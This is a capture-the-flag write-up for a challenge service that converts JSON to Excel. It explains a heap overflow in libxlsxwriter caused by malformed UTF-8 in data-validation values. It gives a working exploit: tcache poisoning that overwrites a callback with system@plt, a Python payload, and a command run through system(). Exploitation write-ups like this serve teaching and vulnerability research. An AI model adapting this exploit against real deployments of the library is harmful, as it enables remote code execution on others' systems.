# XXXLSXXX

**Category:** N-day · **Points:** 1000

> `http://34.24.205.243:5000` — "SheetForge" turns JSON into an Excel workbook.

**Flag:** `kBxAc{_~!@##->C0ngr47u14710n_y0u_4r3_n0w_p4r7_0f_4n0nym0u5_57473_5p0n50r3d_70p_10_31173_6r0up_h3mk3r5<-##@!~_}`

---

## TL;DR

SheetForge builds workbooks with **libxlsxwriter** and accepts base64-encoded
data-validation values, so we can feed the library raw bytes that are **not
valid UTF-8**. The library counts UTF-8 *characters* to enforce Excel's
255-char limit, but it assumes well-formed UTF-8 — a long run of `0x80`
continuation bytes counts as **zero characters**, so the size check passes while
`strcat()` still copies all the bytes → heap overflow. The service disables
ASLR and grooms the heap deterministically, so the overflow becomes a clean
**tcache poisoning**: a later allocation lands on a writable callback pointer at
`0x2201020300`, which we overwrite with `system@plt`. The command copies the
flag to a path the download endpoint will happily serve.

## What We're Given

The handout is small:

```text
sheetforge        # the (stripped) service binary
Dockerfile
docker-compose.yml
flag.txt
```

The Dockerfile pins the exact libxlsxwriter commit used:

```dockerfile
RUN git clone https://github.com/jmcnamara/libxlsxwriter.git && \
    cd libxlsxwriter && \
    git checkout 3227eb0c1556ba41d94605a7abee0e097782d10a && \
    make -j$(nproc)
```

The flag lives at `/flag.txt` and is world-readable, so code execution as the
unprivileged `player` user is enough.

## Initial Recon

Strings in the stripped binary reveal the JSON API fields: `cell`, `values_b64`,
`prealloc`, `data_sheet`, `title_sheet`, `custom_labels`, `logo_b64`, `notes`,
`title`. The docs endpoint advertises `POST /api/report` and
`GET /download/<id>.xlsx`. Decompiling shows every `values_b64` string is
base64-decoded into a raw buffer and passed to
`worksheet_data_validation_cell()` as a list of validation values — that's the
vulnerable path.

## The Vulnerability / Core Concept

libxlsxwriter's UTF-8 length helper trusts its input:

```c
/* Simple strlen that counts UTF-8 characters. Assumes well formed UTF-8. */
size_t lxw_utf8_strlen(const char *str) {
    size_t byte_count = 0, char_count = 0;
    while (str[byte_count]) {
        if ((str[byte_count] & 0xc0) != 0x80)   // skip continuation bytes
            char_count++;
        byte_count++;
    }
    return char_count;
}
```

Continuation bytes (`0x80`–`0xbf`) are simply ignored, so 1000 `0x80` bytes
"count" as zero characters. The validation code uses that count to enforce the
255-char limit, then allocates a fixed buffer and copies with byte-wise
`strcat()`:

```c
str = calloc(1, LXW_VALIDATION_MAX_STRING_LENGTH * 4 + 3);   // 255*4+3 = 1023
strcat(str, "\""); strcat(str, list[0]);
/* ... strcat each remaining value ... */
strcat(str, "\"");
```

The check counts characters; the copy moves bytes. Malformed UTF-8 makes those
two numbers wildly different. The JSON `values_b64` field is what makes it
practical — base64 carries arbitrary invalid UTF-8 that SheetForge decodes
without validating.

**The convenient target.** At startup the binary disables ASLR via
`personality()`, maps 32 MiB of writable memory at fixed `0x2200000000`, and
stores a callback at `0x2201020300`. Later it effectively runs
`ops_callback(notes)`. So the whole goal is:

```text
write system@plt (0x402160) to 0x2201020300  →  system(notes)
```

No shellcode — just reuse the binary's own `system()` PLT entry.

## Building the Exploit

**tcache poisoning with safe-linking.** glibc stores the next-free pointer as
`desired_next XOR (addr_of_entry >> 12)`. Normally that needs a heap leak, but
ASLR is off and the heap is deterministic. The binary's `SHEETFROGE_MEASURE`
mode prints the initial 0x400-byte allocations; GDB confirms the first
vulnerable validation buffer is at `0xa8e050` and the next reusable tcache chunk
at `0xa8e460` (distance `0x410`, the chunk size for a 1023/1024-byte request).

So the poisoned pointer is:

```text
encoded = OPS ^ (next_chunk >> 12)
        = 0x2201020300 ^ 0xa8e
        = 0x220102098e      →  little-endian: 8e 09 02 01 22 00 00 00
```

Neat trick: a C string can't hold an interior NUL, but the library appends a
closing `"` and a NUL after our value. So we supply only `8e 09 02 01`, the
library adds `22 00`, and the already-zero tail completes the pointer. The
overflow payload (opening `"` shifts us by 1, so padding is `0x410 - 1`):

```python
overflow = b"\x80" * 0x40F + struct.pack("<Q", encoded_next)[:4]
```

The request carries two validation entries + a title:

1. Entry 1 allocates `0xa8e050` and overflows into the free `0xa8e460` chunk,
   poisoning its next pointer.
2. Entry 2 consumes `0xa8e460`; tcache now thinks the next free chunk is the
   callback at `0x2201020300`.
3. The app's `malloc(0x400)` for the report **title** is returned at
   `0x2201020300` and filled with `strcpy()`.

`system@plt` is `0x402160` → bytes `60 21 40` → printable `` `!@ ``. Using
`` `!@ `` as the title makes `strcpy()` write `60 21 40 00 00 00 00 00`, so the
callback now points at `system`. With `notes = "cp /flag.txt /tmp/sf_424242.xlsx"`,
the callback runs `system(notes)`, and the download route serves the copied file
regardless of its contents. Full exploit: [`solve.py`](solve.py).

```python
NEXT_CHUNK, OPS, SYSTEM_PLT = 0xA8E460, 0x2201020300, 0x402160
encoded_next = OPS ^ (NEXT_CHUNK >> 12)
overflow = b"\x80" * 0x40F + struct.pack("<Q", encoded_next)[:4]
payload = {
    "notes": f"cp /flag.txt /tmp/sf_{download_id}.xlsx",
    "items": [
        {"cell": "B2", "values_b64": [base64.b64encode(overflow).decode()]},
        {"cell": "B3", "values_b64": [base64.b64encode(b"A").decode()]},
    ],
    "title": struct.pack("<Q", SYSTEM_PLT).rstrip(b"\0").decode(),  # `!@
}
```

## Running It

```bash
$ python3 solve.py
kBxAc{_~!@##->C0ngr47u14710n_y0u_4r3_n0w_p4r7_0f_4n0nym0u5_57473_5p0n50r3d_70p_10_31173_6r0up_h3mk3r5<-##@!~_}
```

The POST connection may drop (we corrupted heap metadata), but the command has
already run and a fresh worker answers the follow-up `GET /download/...`.

## Key Takeaways

- The root bug is the mismatch between **what is checked** (assumed-valid UTF-8
  character count) and **what is copied** (raw untrusted bytes).
- base64 input fields quietly let attackers smuggle bytes that JSON/UTF-8
  validation would otherwise reject.
- Disabled ASLR + fixed mappings + a writable callback + an imported `system()`
  turn a messy heap overflow into a tidy, reliable tcache-poisoning exercise.
